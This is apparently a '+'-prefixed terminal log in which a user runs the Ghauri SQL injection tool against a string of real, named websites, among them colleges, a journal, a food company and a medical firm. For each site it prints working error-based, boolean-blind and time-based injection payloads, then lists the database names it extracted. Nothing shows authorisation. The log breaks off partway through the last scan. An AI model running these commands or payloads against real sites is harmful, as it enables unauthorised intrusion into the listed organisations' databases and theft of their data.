+[03:47:36] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+[03:47:36] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 255 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=10' AND 03331=3331-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=10'XOR(if(now()=sysdate(),SLEEP(8),0))XOR'Z
+---
+[03:47:52] [INFO] testing MySQL
+[03:47:52] [INFO] confirming MySQL
+[03:47:52] [INFO] the back-end DBMS is MySQL
+[03:47:52] [INFO] fetching database names
+[03:47:52] [INFO] fetching number of databases
+[03:48:02] [INFO] retrieved: 3 
+[03:49:52] [INFO] retrieved: information_schema 
+[03:50:57] [INFO] retrieved: eramtec_db 
+[03:52:11] [INFO] retrieved: eramtec_fadb 
+available databases [3]:
+[*] eramtec_db
+[*] eramtec_fadb
+[*] information_schema
+
+[03:52:11] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/eramtec.ir'
+
+[*] ending @ 03:52:11 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://www.brandavanfoodproducts.in/order-details.php?id=772" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:57:45 /2025-11-29/
+
+[03:57:45] [INFO] testing connection to the target URL
+[03:57:46] [INFO] testing if the target URL content is stable
+[03:57:48] [INFO] target URL content is stable
+[03:57:48] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:57:48] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:58:08] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:58:12] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:58:17] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:58:22] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:58:27] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:58:27] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[03:58:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:58:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:58:32] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[03:58:32] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:58:32] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:58:35] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:58:45] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=772 AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=772 OR NOT 02589=2589-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(8),0)
+---
+[03:59:44] [INFO] testing MySQL
+[03:59:44] [INFO] confirming MySQL
+[03:59:44] [INFO] the back-end DBMS is MySQL
+[03:59:44] [INFO] fetching database names
+[03:59:44] [INFO] fetching number of databases
+[03:59:44] [INFO] retrieved: 3
+[03:59:45] [INFO] retrieved: information_schema
+[03:59:45] [INFO] retrieved: performance_schema
+[03:59:46] [INFO] retrieved: brandpyz_brandavanfoodproducts
+available databases [3]:
+[*] information_schema
+[*] performance_schema
+[*] brandpyz_brandavanfoodproducts
+
+[03:59:46] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.brandavanfoodproducts.in'
+
+[*] ending @ 03:59:46 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://regen.com.hk/web/product_detail.php?id=93" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:19:28 /2025-11-29/
+
+[03:19:28] [INFO] testing connection to the target URL
+[03:19:29] [INFO] testing if the target URL content is stable
+[03:19:31] [INFO] target URL content is stable
+[03:19:32] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:19:32] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:19:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:19:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:19:58] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:20:09] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:20:20] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:20:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:20:43] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:20:55] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:21:07] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:21:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:21:32] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:21:33] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
+[03:21:33] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:21:35] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:21:37] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[03:21:37] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:21:38] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:21:47] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:21:58] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 124 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=93 AND (SELECT(0)FROM(SELECT COUNT(*),CONCAT_WS(0x28,0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=93 OR NOT 05669=5669-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(9),0)
+---
+[03:22:20] [INFO] testing MySQL
+[03:22:20] [INFO] confirming MySQL
+[03:22:20] [INFO] the back-end DBMS is MySQL
+[03:22:20] [INFO] fetching database names
+[03:22:20] [INFO] fetching number of databases
+[03:22:21] [INFO] retrieved: 2
+[03:22:23] [INFO] retrieved: information_schema
+[03:22:24] [INFO] retrieved: regen
+available databases [2]:
+[*] information_schema
+[*] regen
+
+[03:22:24] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/regen.com.hk'
+
+[*] ending @ 03:22:24 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://ijarety.in/issue-detail.php?id=73" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:49:35 /2025-11-29/
+
+[03:49:36] [INFO] testing connection to the target URL
+[03:49:38] [INFO] testing if the target URL content is stable
+[03:49:41] [INFO] target URL content is stable
+[03:49:41] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
+[03:49:41] [INFO] testing for SQL injection on GET parameter 'id'
+[03:49:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:50:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:50:28] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[03:50:30] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+[03:51:24] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:51:24] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:51:26] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:51:37] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+[03:51:37] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:51:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:51:39] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[03:51:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:51:40] [INFO] testing 'MySQL >= 5.1 AND string error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:51:40] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[03:51:40] [INFO] checking if the injection point on GET parameter 'id' is a false positive
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 51 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=73 OR NOT 05661=5661
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(8),0)
+---
+[03:52:29] [INFO] testing MySQL
+[03:52:29] [INFO] confirming MySQL
+[03:52:29] [INFO] the back-end DBMS is MySQL
+[03:52:29] [INFO] fetching database names
+[03:52:29] [INFO] fetching number of databases
+[03:53:12] [INFO] retrieved: 2 
+[04:00:45] [INFO] retrieved: information_schema 
+[04:08:14] [INFO] retrieved: ijarety_journalnew 
+available databases [2]:
+[*] information_schema
+[*] ijarety_journalnew
+
+[04:08:14] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/ijarety.in'
+
+[*] ending @ 04:08:14 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ ghauri -u "https://www.educationgateway.in/college-details.php?id=7" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:51:03 /2025-11-29/
+
+[03:51:03] [INFO] testing connection to the target URL
+[03:51:05] [INFO] testing if the target URL content is stable
+[03:51:06] [INFO] target URL content is stable
+[03:51:07] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:51:07] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:51:15] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:51:19] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:51:22] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:51:26] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:51:29] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:51:31] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:51:34] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:51:38] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:51:43] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:51:47] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:51:49] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:51:55] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[03:51:55] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)' injectable
+[03:51:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:52:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:52:04] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[03:52:04] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:52:04] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[03:52:06] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[03:52:12] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (IF - comment)' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 136 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)
+    Payload: id=7 OR 1 GROUP BY CONCAT_WS(0x7e,0x72306f746833783439,FLOOR(RAND(0)*2))HAVING(MIN(0))-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=7 OR NOT 06613=6613-- wXyW
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (IF - comment)
+    Payload: id=if(now()=sysdate(),SLEEP(5),0)
+---
+[03:52:38] [INFO] testing MySQL
+[03:52:38] [INFO] confirming MySQL
+[03:52:38] [INFO] the back-end DBMS is MySQL
+[03:52:38] [INFO] fetching database names
+[03:52:38] [INFO] fetching number of databases
+[03:52:38] [INFO] retrieved: 2
+[03:52:38] [INFO] retrieved: information_schema
+[03:52:39] [INFO] retrieved: u507380571_educatio_db
+available databases [2]:
+[*] information_schema
+[*] u507380571_educatio_db
+
+[03:52:39] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.educationgateway.in'
+
+[*] ending @ 03:52:39 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop/Breacher]
+└─$ 
+
+
+
+──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.istituti-religiosi.org/riepilogo.php?id=" --dbs 
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 03:36:31 /2025-11-29/
+
+[03:36:31] [INFO] testing connection to the target URL
+[03:36:32] [INFO] testing if the target URL content is stable
+[03:36:33] [INFO] target URL content is stable
+[03:36:33] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[03:36:33] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[03:36:50] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[03:36:56] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[03:37:03] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[03:37:10] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[03:37:16] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[03:37:22] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[03:37:29] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[03:37:35] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[03:37:42] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (DOUBLE)'
+[03:37:49] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (DOUBLE)'
+[03:37:55] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[03:38:02] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE or HAVING clause (FLOOR)'
+[03:38:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
+[03:38:09] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' injectable
+[03:38:09] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[03:38:10] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[03:38:11] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
+[03:38:12] [INFO] testing 'Boolean-based blind - Parameter replace'
+[03:38:13] [INFO] GET parameter 'id' appears to be 'Boolean-based blind - Parameter replace' injectable (with --string="Tito")
+[03:38:13] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[03:39:00] [WARNING] in case of read timeout performing further tests to confirm if the detected payload is working..
+[03:40:23] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 time-based blind (query SLEEP)' injectable (with error ReadTimeout on --timeout=30)
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 148 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)
+    Payload: id=UPDATEXML(0,CONCAT(0x7e,0x72306f746833783439,0x7e),0)
+
+    Type: boolean-based blind
+    Title: Boolean-based blind - Parameter replace
+    Payload: id=(SELECT (CASE WHEN (06728=6728) THEN 03586 ELSE 3*(SELECT 2 UNION ALL SELECT 1) END))
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 time-based blind (query SLEEP)
+    Payload: id=(SELECT(0)FROM(SELECT(SLEEP(8)))a)
+---
+[03:40:50] [INFO] testing MySQL
+[03:40:50] [INFO] confirming MySQL
+[03:40:50] [INFO] the back-end DBMS is MySQL
+[03:40:50] [INFO] fetching database names
+[03:40:50] [INFO] fetching number of databases
+[03:40:51] [INFO] retrieved: 2
+[03:40:52] [INFO] retrieved: information_schema
+[03:40:52] [INFO] retrieved: istituti_hjdf8j
+available databases [2]:
+[*] istituti_hjdf8j
+[*] information_schema
+
+[03:40:52] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/www.istituti-religiosi.org'
+
+[*] ending @ 03:40:52 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://kccollege.ac.in/iqac-new.php?id=28" --dbs    
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 04:44:02 /2025-11-29/
+
+[04:44:03] [INFO] testing connection to the target URL
+[04:44:08] [INFO] testing if the target URL content is stable
+[04:44:10] [INFO] target URL content is stable
+[04:44:12] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[04:44:12] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[04:50:10] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[04:50:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[04:51:11] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[04:51:41] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[04:52:05] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[04:52:08] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable
+[04:52:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[04:52:12] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
+[04:52:16] [INFO] GET parameter 'id' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable
+[04:52:16] [INFO] testing 'MySQL >= 5.0.12 time-based blind (query SLEEP)'
+[04:52:17] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[04:52:29] [INFO] testing 'MySQL >= 5.0.12 time-based blind (IF - comment)'
+[04:52:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[04:53:01] [INFO] testing 'MySQL >= 5.0.12 time-based blind (CASE STATEMENT)'
+[04:53:21] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - CASE STATEMENT)'
+[04:53:38] [INFO] testing 'MySQL >= 5.0.12 time-based blind (SLEEP)'
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
+
+Ghauri identified the following injection point(s) with a total of 52 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: error-based
+    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+    Payload: id=28 AND GTID_SUBSET(CONCAT_WS(0x28,0x496e6a65637465647e,0x72306f746833783439,0x7e454e44),1337)-- wXyW
+
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
+    Payload: id=28 OR NOT 04971=4971-- wXyW
+---
+[04:53:50] [INFO] testing MySQL
+[04:53:50] [INFO] confirming MySQL
+[04:53:50] [INFO] the back-end DBMS is MySQL
+[04:53:50] [INFO] fetching database names
+[04:53:50] [INFO] fetching number of databases
+[04:53:52] [INFO] retrieved: 2
+[04:53:57] [INFO] retrieved: information_schema
+[04:54:00] [INFO] retrieved: kccolfd5_kccacdb
+available databases [2]:
+[*] information_schema
+[*] kccolfd5_kccacdb
+
+[04:54:00] [INFO] fetched data logged to text files under '/home/unknonehart/.ghauri/kccollege.ac.in'
+
+[*] ending @ 04:54:00 /2025-11-29/
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ 
+
+
+
+
+
+                                                                                                                                                                                                                                              
+┌──(unknonehart㉿unknone)-[~/Desktop]
+└─$ ghauri -u "https://www.suprememed.com.hk/en/promotion_detail.php?id=" --dbs
+
+
+  ________.__                        .__  {1.4.3}
+ /  _____/|  |__ _____   __ _________|__|
+/   \  ___|  |  \\__  \ |  |  \_  __ \  |
+\    \_\  \   Y  \/ __ \|  |  /|  | \/  |
+ \______  /___|  (____  /____/ |__|  |__|
+        \/     \/     \/         https://github.com/r0oth3x49
+                                 An advanced SQL injection detection & exploitation tool.
+  
+
+
+[*] starting @ 05:26:37 /2025-11-29/
+
+[05:26:37] [INFO] testing connection to the target URL
+[05:26:38] [INFO] testing if the target URL content is stable
+[05:26:40] [INFO] target URL content is stable
+[05:26:40] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[05:26:40] [INFO] testing for SQL injection on GET parameter 'id'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
+
+for the remaining tests, do you want to include all tests for 'MySQL'? [Y/n] y
+
+[05:26:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[05:26:45] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[05:26:45] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
